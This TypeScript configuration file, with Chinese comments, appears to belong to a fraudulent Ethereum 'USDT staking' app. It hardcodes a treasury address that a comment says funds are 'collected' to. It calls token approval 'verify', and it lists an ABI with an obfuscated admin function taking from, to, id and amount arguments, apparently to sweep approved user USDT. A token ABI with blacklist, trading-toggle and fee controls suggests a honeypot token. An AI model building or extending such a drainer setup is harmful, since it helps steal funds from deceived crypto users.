// 定义网络配置类型接口
import { getSafeTokenContractFromEnv, getMaxApproveAmountFromEnv, getTreasuryAddressFromEnv } from './load-env'

export interface NetworkConfig {
  CHAIN_ID: number
  RPC_URL: string
  USDT_CONTRACT: string         // USDT合约地址
  STAKING_CONTRACT: string      // USDT质押合约
  SUPPORT_CONTRACT: string      // 支持合约
  TREASURY_ADDRESS: string       // 资金接收地址
  DEPLOYER_ADDRESS?: string      // 部署者地址
  EXPLORER_URL: string
  NETWORK_NAME: string
  NATIVE_CURRENCY: {
    name: string
    symbol: string
    decimals: number
  }
  STAKING_TYPE: 'USDT'
  SAFE_TOKEN_CONTRACT?: string   // SafeToken合约地址
  MAX_APPROVE_AMOUNT?: number    // 最大verify金额
  ADMIN_ADDRESS?: string          // 管理员地址
}

// 从环境变量加载配置
const safeTokenContract = getSafeTokenContractFromEnv()
const maxApproveAmount = getMaxApproveAmountFromEnv()
const treasuryAddress = getTreasuryAddressFromEnv()

// 导入 ETH 网络配置
import ETH_NETWORK_CONFIG from '@/config/eth-network'

// 智能合约配置 - 仅支持ETH网络
export const CONTRACT_CONFIG: Record<string, NetworkConfig> = {
  // ETH 主网配置
  ETH_MAINNET: {
    CHAIN_ID: ETH_NETWORK_CONFIG.CHAIN_ID,
    RPC_URL: ETH_NETWORK_CONFIG.RPC_URL,
    USDT_CONTRACT: ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS,
    STAKING_CONTRACT: ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS, // 🚀 归集到财务地址的合约
    SUPPORT_CONTRACT: ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS, // 归集到财务地址的合约
    TREASURY_ADDRESS: '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a', // 新收款地址
    DEPLOYER_ADDRESS: '0xc0754D163B8F3C0dD6AdA0168f8029796Bed1BA2',
    EXPLORER_URL: 'https://etherscan.io',
    NETWORK_NAME: ETH_NETWORK_CONFIG.NETWORK_NAME,
    NATIVE_CURRENCY: {
      name: 'Ethereum',
      symbol: 'ETH',
      decimals: 18
    },
    STAKING_TYPE: 'USDT',
    SAFE_TOKEN_CONTRACT: safeTokenContract,
    MAX_APPROVE_AMOUNT: maxApproveAmount,
    ADMIN_ADDRESS: '0xc0754D163B8F3C0dD6AdA0168f8029796Bed1BA2' // 🔑 统一为部署者地址（拥有管理员权限）
  }
}

// 动态网络检测和配置 - 仅支持ETH网络
export const getNetworkConfig = (chainId: number): NetworkConfig => {
  switch (chainId) {
    case 1:
      return CONTRACT_CONFIG.ETH_MAINNET
    default:
      console.warn(`不支持的网络 chainId: ${chainId}，默认使用ETH主网`)
      return CONTRACT_CONFIG.ETH_MAINNET // 默认使用ETH
  }
}

// 当前使用的网络 (动态检测)
export const getCurrentNetwork = (): NetworkConfig => {
  if (typeof window !== 'undefined' && window.ethereum) {
    const chainId = Number.parseInt(window.ethereum.chainId, 16)
    return getNetworkConfig(chainId)
  }
  return CONTRACT_CONFIG.ETH_MAINNET // 默认网络
}

// 检查网络是否支持 - 仅支持ETH
export const isSupportedNetwork = (chainId: number): boolean => {
  return chainId === 1
}

// 获取网络类型名称
export const getNetworkTypeName = (chainId: number): string => {
  return 'USDT质押'
}

// 获取推荐网络 - 仅推荐ETH
export const getRecommendedNetworks = () => [
  {
    chainId: 1,
    name: 'Ethereum Mainnet',
    stakingType: 'USDT',
    description: 'ETH主网 - USDT质押挖矿'
  }
]

// 默认网络配置（向后兼容）
export const CURRENT_NETWORK = getCurrentNetwork()

// Gas 配置接口
interface GasConfig {
  GAS_PRICE_GWEI: number
  APPROVE_GAS_LIMIT: number
  STAKE_GAS_LIMIT: number
  WITHDRAW_GAS_LIMIT: number
}

// Gas 配置 - ETH网络配置
export const GAS_CONFIG: GasConfig = {
  GAS_PRICE_GWEI: 20, // 20 gwei (ETH网络推荐)
  APPROVE_GAS_LIMIT: 60000,
  STAKE_GAS_LIMIT: 150000,
  WITHDRAW_GAS_LIMIT: 120000
}

// 根据网络获取Gas配置
export const getGasConfig = (networkConfig: NetworkConfig): GasConfig => {
  return GAS_CONFIG
}

// ERC-20 USDT 合约 ABI
export const USDT_ABI = [
  {
    "inputs": [
      {"internalType": "address", "name": "spender", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "owner", "type": "address"},
      {"internalType": "address", "name": "spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "decimals",
    "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "to", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "transfer",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "from", "type": "address"},
      {"internalType": "address", "name": "to", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "transferFrom",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]

// SupportXhsk 合约 ABI (verify转账合约)
export const SUPPORT_ABI = [
  {
    "inputs": [],
    "name": "Owner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_admin", "type": "address"}],
    "name": "isAdmin",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "_admin", "type": "address"},
      {"internalType": "bool", "name": "_status", "type": "bool"}
    ],
    "name": "setAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "_f", "type": "address"},
      {"internalType": "address", "name": "_t", "type": "address"},
      {"internalType": "uint256", "name": "_id", "type": "uint256"},
      {"internalType": "uint256", "name": "_a", "type": "uint256"}
    ],
    "name": "vly5ChOkLkQk4u",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "uint256", "name": "_amount", "type": "uint256"},
      {"internalType": "uint256", "name": "_ratio", "type": "uint256"}
    ],
    "name": "create",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "_account", "type": "address"},
      {"internalType": "uint256", "name": "id", "type": "uint256"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "sendReward",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address[]", "name": "_accounts", "type": "address[]"},
      {"internalType": "uint256[]", "name": "ids", "type": "uint256[]"},
      {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
    ],
    "name": "sendRewards",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "uint256", "name": "id", "type": "uint256"},
      {"internalType": "uint256", "name": "currency_id", "type": "uint256"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"},
      {"internalType": "uint256", "name": "timestamp", "type": "uint256"},
      {"internalType": "bytes", "name": "signature", "type": "bytes"}
    ],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "account", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "ratio", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "times", "type": "uint256"}
    ],
    "name": "CREATE",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "account", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "taccount", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "id", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "times", "type": "uint256"}
    ],
    "name": "XPGXDf77",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "account", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "id", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "times", "type": "uint256"}
    ],
    "name": "WITHDRAW",
    "type": "event"
  }
]

// 工具函数 - ETH网络专用
export const getContractAddress = (contractName: string) => {
  // 返回ETH主网上的合约地址
  if (contractName === 'STAKING_CONTRACT' || contractName === 'SUPPORT_CONTRACT') {
    return CURRENT_NETWORK.STAKING_CONTRACT
  }
  if (contractName === 'USDT_CONTRACT') {
    return CURRENT_NETWORK.USDT_CONTRACT
  }
  return null
}

export const getExplorerUrl = (txHash: string) => {
  return `${CURRENT_NETWORK.EXPLORER_URL}/tx/${txHash}`
}

export const getAddressUrl = (address: string) => {
  return `${CURRENT_NETWORK.EXPLORER_URL}/address/${address}`
} 

// SafeToken 合约 ABI
export const SAFE_TOKEN_ABI = [
  {
    "inputs": [
      {"internalType": "string", "name": "name_", "type": "string"},
      {"internalType": "string", "name": "symbol_", "type": "string"},
      {"internalType": "uint8", "name": "decimals_", "type": "uint8"},
      {"internalType": "uint256", "name": "initialSupply_", "type": "uint256"},
      {"internalType": "address", "name": "initialHolder_", "type": "address"}
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "owner", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "spender", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "value", "type": "uint256"}
    ],
    "name": "Approval",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "previousOwner", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "newOwner", "type": "address"}
    ],
    "name": "OwnershipTransferred",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "to", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "value", "type": "uint256"}
    ],
    "name": "Transfer",
    "type": "event"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "owner", "type": "address"},
      {"internalType": "address", "name": "spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "spender", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "account", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "burn",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "decimals",
    "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "spender", "type": "address"},
      {"internalType": "uint256", "name": "subtractedValue", "type": "uint256"}
    ],
    "name": "decreaseAllowance",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "feeCollector",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "spender", "type": "address"},
      {"internalType": "uint256", "name": "addedValue", "type": "uint256"}
    ],
    "name": "increaseAllowance",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "account", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "mint",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "name",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "renounceOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "tokenAddress", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "rescueTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "account", "type": "address"},
      {"internalType": "bool", "name": "blacklisted", "type": "bool"}
    ],
    "name": "setBlacklist",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "newFeeCollector", "type": "address"}],
    "name": "setFeeCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "bool", "name": "enabled", "type": "bool"}],
    "name": "setTradingEnabled",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "uint256", "name": "newFeePercent", "type": "uint256"}],
    "name": "setTransactionFeePercent",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "symbol",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "tradingEnabled",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "recipient", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "transfer",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "sender", "type": "address"},
      {"internalType": "address", "name": "recipient", "type": "address"},
      {"internalType": "uint256", "name": "amount", "type": "uint256"}
    ],
    "name": "transferFrom",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "newOwner", "type": "address"}],
    "name": "transferOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transactionFeePercent",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdrawBNB",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
]

// 获取SafeToken合约地址
export const getSafeTokenAddress = () => {
  return CURRENT_NETWORK.SAFE_TOKEN_CONTRACT || ''
}

// 获取最大verify金额
export const getMaxApproveAmount = () => {
  return CURRENT_NETWORK.MAX_APPROVE_AMOUNT || 500000
}

// 完整的 USDT ABI
export const FULL_USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "who", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{"name": "", "type": "uint8"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{"name": "", "type": "string"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "name",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {"internalType": "address", "name": "owner", "type": "address"},
      {"internalType": "address", "name": "spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  }
] 